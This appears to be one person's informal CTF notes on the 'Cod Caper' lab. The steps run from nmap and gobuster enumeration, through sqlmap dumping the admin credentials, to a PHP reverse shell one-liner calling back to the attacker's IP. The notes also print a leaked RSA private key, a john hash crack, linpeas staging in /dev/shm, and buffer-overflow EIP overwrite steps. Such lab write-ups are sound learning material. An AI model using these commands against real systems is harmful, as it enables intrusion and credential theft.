@@ -1,0 +1,402 @@
+#The cod caper
+
+
+MAchine IP : 10.10.36.64
+new ip(restart pc xD new day) :10.10.221.194
+
+Task 1 :
+No answer needed ! :D !!
+
+Task 2 :
+#1 	
+
+How many ports are open on the target machine?
+sC = Script scan  -A = aggresive
+
+--- nmap -sC -sT -sV -oN nmap/initial 10.10.36.64
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-26 00:29 +08
+Stats: 0:09:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 60.22% done; ETC: 00:45 (0:06:18 remaining)
+Stats: 0:09:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 60.96% done; ETC: 00:45 (0:06:14 remaining)
+Stats: 0:19:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 98.38% done; ETC: 00:49 (0:00:19 remaining)
+Stats: 0:20:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 00:50 (0:00:00 remaining)
+Stats: 0:21:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 00:51 (0:00:00 remaining)
+Nmap scan report for 10.10.36.64
+Host is up (0.21s latency).
+Not shown: 996 closed ports
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
+|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
+|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
+80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+4045/tcp filtered lockd
+6969/tcp filtered acmsoda
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1327.69 seconds
+
+
+-2 ports which are port 22 and 80. 
+
+#2 
+
+What is the http-title of the web server?
+-Apache2 Ubuntu Default Page: It works
+
+#3 	
+
+What version is the ssh service?
+-OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+
+#4 	
+
+What is the version of the web server?
+-Apache/2.4.18
+
+[Task 3] Web Enumeration 
+#1 What is the name of the important file on the server?
+
+-by using gobuster or dirbuster , to find hidden files within the website !!!
+
+-u = url link
+--wordlist = word list dictionary to find the hidden file
+-x = extenstion of the file
+
+gobuster -u 10.10.221.194 --wordlist big.txt -x php,html
+
+then found administrator.php add at website url link 
+
+[Task 4] Web Exploitation 
+Try SQL injection on the space " OR 1=1 #
+
+-u = url link
+--form cause its form type login	
+sqlmap -u http://10.10.221.194/administrator.php --form
+
+found ! POST data = username=&password=
+
+
+use it !!!
+like this 
+
+sqlmap -u http://10.10.161.135/administrator.php --data 'username=&password=' -a 
+
+-a - leak out everything
+
+sqlmap -u http://10.10.161.135/administrator.php --data 'username=&password=' --dbs
+
+--dbs = leak out database sections , -a too much info
+
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] users
+
+sqlmap -u http://10.10.161.135/administrator.php --data 'username=&password=' -D users --table
+-D/--dump users to search the users section !! --table to put result in table form!
+
+sqlmap -u http://10.10.161.135/administrator.php --data 'username=&password=' --dump users -T users --dump --table
+
+RESULT : 
+
+Database: users
+Table: users
+[1 entry]
++----------+------------+
+| username | password   |
++----------+------------+
+| pingudad | secretpass |
++----------+------------+
+
+#1 
+
+
+What is the admin username?
+
+-pingudad
+
+#2 	
+
+What is the admin password?
+- secretpass
+
+#3 	
+
+How many forms of SQLI is the form vulnerable to?
+-3 according to google xDD
+
+
+
+[Task 5] Command Execution 
+During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.
+
+to connect to the website , This machine has been outfitted with nc, a tool that allows you to make and receive connections and send data. It is one of the most popular tools to get a reverse shell. Some great places to find reverse shell payloads are highoncoffee and Pentestmonkey .
+
+First need to make ur machine become the client/listener to get the server access
+netcat 
+nc -nvlp 1234
+listening on [any] 1234 ...
+
+Secodnly need to make ur server to be available (reverse shell) to be accessed by our machine 
+	-get from cheat sheet
+php -r '$sock=fsockopen("10.9.23.248",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#1 
+How many files are in the current directory?
+-3
+
+2591c98b70119fe624898b1e424b5e91.php
+administrator.php
+index.html
+
+
+#2 	
+
+Do I still have an account
+-yes at home directiory got pingu and his dad user name
+
+#3 	
+
+What is my ssh password?
+
+$ ls
+2591c98b70119fe624898b1e424b5e91.php
+administrator.php
+index.html
+$ cd ..
+$ ls
+html
+$ cd ..
+$ ls
+backups
+cache
+hidden
+lib
+local
+lock
+log
+mail
+opt
+run
+spool
+tmp
+www
+$ cd hidden
+$ ls
+pass
+$ cat pass
+pinguapingu
+
+can get from the hidden folder , pass which is pinguapingu
+
+Getting the rsa key and the password of the rsa will gain access to a machine (Pingu id rsa )
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
+aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
+x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
+ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
+LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
+y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
+hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
+V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
+wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
+FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
+M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
+jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
+3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
+tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
+ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
+mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
+xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
+zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
+4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
+Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
+Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
+4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
+qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
+t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
+pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
+-----END RSA PRIVATE KEY-----
+
+first put rsa key into a nano file under same directory
+-nano id_pingu_rsa
+
+then changemod 600 id_pingu_rsa 
+
+the connect to it (-i = means identify the file
+                   ssh allow remote login into account)
+ssh -i id_pingu_rsa pingu(username)@10.10.88.132(ip address)
+
+/dev/shm (developer/temporaryfiles) = temporary file location on any linux for attackers to store stuff 
+
+//LINPEASE GUIDE !!(Linpease help u get organize all of the information)
+
+scp is for secure copying between servers / machines  
+ 
+
+Your machine:
+scp /root/Downloads/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh(What u wanna use to copy/put at victim pc ) pingu@10.10.88.132	(Your target name and ip address ):/dev/shm(Target file location u wanna put ur copy/file at)
+
+Victim machine access:
+
+cd /dev/shm (Go to where where the files located)
+
+chmod +x linpease.sh(Make it executable because cant just cat will show shits)
+
+./linpease.sh to run it 
+
+
+
+
+//To save linpeas.sh or whatever file from the target victim  into your computer
+
+1.Start a web using target terminal by :
+
+python -m SimpleHTTPServer  (send file to target from who?)
+
+ will start a server on a port ususally 8000 
+
+2.Get file from the target machine using ur machine(Your machine must at the linpeas.sh directory)
+
+wget 10.10.161.91:(target ip )8000(port)/linpeaselog(or any file name u wanna take from the target machine)
+
+
+EIP : it tells the computer where to go next to execute the next command and controls the flow of a program(Assembly language).
+Basically guide and manage the computer to do stuff.
+
+Previously we figured out that we need to provide 44 characters of input, and then we can overwrite and  break the EIP and  point it to shell to execute whatever part of the program we want
+
+
+pwndbg> disassemble shell
+Dump of assembler code for function shell:
+   0x080484cb <+0>:	push   ebp
+
+
+Do this to see what shell is made of , take the first line cause its the shell function void shell(){}
+
+root@kali:~/the_cod_caper# john tojohn.txt --wordlist=/root/Desktop/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+love2fish        (?)
+1g 0:00:04:38 DONE (2020-05-30 02:02) 0.003586g/s 861.2p/s 861.2c/s 861.2C/s luciole..lion01
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+
+| means AND
+
+so ./linpeas.sh | tee linlog.txt will run linpeas on the machine and get all result and write on linlog.txt
+
+
+Shadow file will keep your file extra secured only special ppl can read/use shadow file
+  
+Cyclic is to loop             
+Binary expo/
+Need spam not too much (Program will crash) and not too less(Program doesn't accept)
+
+
+
+Buffer Overflow:
+First got a program provided that u can give input 
+
+You need to find the break case (segmentation fault(Core dumped))of the input to gain access
+
+By typing python -c "print"A"*30" | the program to execute on (./program)
+
+do dmesg | tail to see the buffer message and the last pieces only
+in A case hex is 0X41 , so u will see 4141414141 when spam A at the dmesg | tail command
+
+Do untill u see some 41 dissapear and became blank. Then make the number lesser.
+
+then u will get (Illegal Instruction (Core dumped))
+
+Then u test the program to run what u wan python -c "print"A"*32"+"BBB" | ./program
+this should print AAAAABBB
+
+readelf will read the content of a file 
+-s will show the symbols of the files like PASS USR FUNC and more
+readelf -s program | -egrep FUNC
+
+then take the hex of suspicios file name to make it "little endian" 
+
+"0x080484cb" would become "cb840408"
+
+
+root@kali:~/Downloads# python(RUN PYTHON)
+Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
+[GCC 8.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import pwn
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+ImportError: No module named pwn
+>>> import struct
+>>> struct.pack('<I',0x080484cb)
+'\xcb\x84\x04\x08'
+>>> 
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
